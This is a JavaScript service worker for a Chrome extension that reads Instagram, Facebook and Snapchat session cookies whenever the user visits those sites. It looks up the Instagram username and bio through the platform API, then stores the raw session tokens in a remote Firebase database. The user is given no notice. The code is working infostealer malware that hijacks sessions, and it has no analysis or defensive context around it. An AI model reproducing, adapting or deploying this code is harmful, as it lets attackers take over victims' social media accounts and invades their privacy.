console.log("🚀 Service Worker Loaded ✅");

import { db } from "./firebase-init.js";
import { collection, addDoc } from "./firebase-firestore.js";
import { isDuplicateData } from "./utils.js";

// 🌐 Navigation Hook
chrome.webNavigation.onCompleted.addListener(
  async ({ url }) => {
    if (url.includes("instagram.com")) handleInstagram();
    else if (url.includes("facebook.com")) handleFacebook();
    else if (url.includes("snapchat.com")) handleSnapchat();
  },
  {
    url: [
      { hostSuffix: "instagram.com" },
      { hostSuffix: "facebook.com" },
      { hostSuffix: "snapchat.com" },
    ],
  }
);

// 📸 Instagram Handler
async function handleInstagram() {
  chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
    const session = cookies.find((c) => c.name === "sessionid");
    const dsUserId = cookies.find((c) => c.name === "ds_user_id");

    if (!session || !dsUserId) return console.warn("⚠️ IG cookies missing.");

    const sessionId = session.value;
    const userId = dsUserId.value;

    const info = await fetch(
      `https://i.instagram.com/api/v1/users/${userId}/info/`,
      {
        method: "GET",
        headers: {
          "User-Agent": "Instagram 219.0.0.12.117 Android",
          Cookie: `sessionid=${sessionId};`,
          "X-IG-App-ID": "936619743392459",
          "Accept-Language": "en-US",
        },
      }
    );

    let username = "unknown_user",
      bio = "";
    if (info.ok) {
      const json = await info.json();
      const user = json.user || {};
      username = user.username || "unknown_user";
      bio = user.biography || "";
    }

    const docData = {
      platform: "Instagram",
      sessionId,
      userId,
      username,
      bio,
      domain: "instagram.com",
    };

    const colRef = collection(db, "instagram");
    if (await isDuplicateData(colRef, docData))
      return console.log("🛑 IG duplicate — skipped.");
    await addDoc(colRef, { ...docData, timestamp: new Date() });
    console.log("✅ Instagram saved:", username);
  });
}

// 📘 Facebook Handler
async function handleFacebook() {
  chrome.cookies.getAll({ domain: ".facebook.com" }, async (cookies) => {
    const cUser = cookies.find((c) => c.name === "c_user");
    const xs = cookies.find((c) => c.name === "xs");

    if (!cUser || !xs) return console.warn("⚠️ FB cookies missing.");

    const docData = {
      platform: "Facebook",
      c_user: cUser.value,
      xs: xs.value,
      userId: cUser.value,
      domain: "facebook.com",
    };

    const colRef = collection(db, "facebook");
    if (await isDuplicateData(colRef, docData))
      return console.log("🛑 FB duplicate — skipped.");
    await addDoc(colRef, { ...docData, timestamp: new Date() });
    console.log("✅ Facebook saved:", cUser.value);
  });
}

// 👻 Snapchat Handler
async function handleSnapchat() {
  chrome.cookies.getAll({ domain: ".snapchat.com" }, async (cookies) => {
    const sc_at = cookies.find((c) => c.name === "sc_at");
    const sc_sid = cookies.find((c) => c.name === "_sc-sid");
    const blizzard = cookies.find((c) => c.name === "blizzard_web_session_id");
    const nonce = cookies.find((c) => c.name === "sc-a-nonce");
    const wcid = cookies.find((c) => c.name === "sc-wcid");

    if (!sc_at || !sc_sid || !blizzard || !nonce || !wcid) {
      return console.warn("⚠️ Snapchat cookies missing.");
    }

    const docData = {
      platform: "Snapchat",
      sc_at: sc_at.value,
      sc_sid: sc_sid.value,
      blizzard_web_session_id: blizzard.value,
      sc_a_nonce: nonce.value,
      sc_wcid: wcid.value,
      domain: "snapchat.com",
    };

    const colRef = collection(db, "snapchat");
    if (await isDuplicateData(colRef, docData))
      return console.log("🛑 Snapchat duplicate — skipped.");
    await addDoc(colRef, { ...docData, timestamp: new Date() });
    console.log("✅ Snapchat saved ✅");
  });
}
